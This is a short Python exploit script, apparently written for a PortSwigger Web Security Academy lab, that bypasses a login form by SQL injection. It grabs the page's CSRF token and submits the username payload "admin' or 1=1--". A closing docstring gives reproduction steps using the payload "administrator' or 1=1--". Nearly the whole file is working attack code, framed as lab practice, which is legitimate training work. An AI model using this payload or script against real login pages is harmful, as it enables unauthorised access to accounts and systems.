#!/usr/bin/env python3

import requests, re

username = "admin' or 1=1--"
password = "admin"

URL = 'https://0ae500e704677d45822ccebb00ea0073.web-security-academy.net/login'

session = requests.Session()

# Step 1: GET login page -> CSRF token
r = session.get(URL)
csrf = re.findall(r'name="csrf" value="(.+?)"', r.text)[0]
print(f'[*] CSRF token: {csrf}')

# Step 2: POST login
data = {'username': username,
        'password': password,
        'csrf': csrf
    }

r = session.post(URL, data=data)
print(f'[*] Status: {r.status_code}')

# Step 3: Check result
if r.status_code == 500:
    print('[!] Internal Server Error!')


"""
Steps to Reproduce

1. Open browser and access to the endpoint `/login`
2. Input username `admin'` and password `admin` and login the server display "Internal Server Error".
3. Input this payload into username field username `administrator' or 1=1--` and password "admin" this will bypass login page. 
"""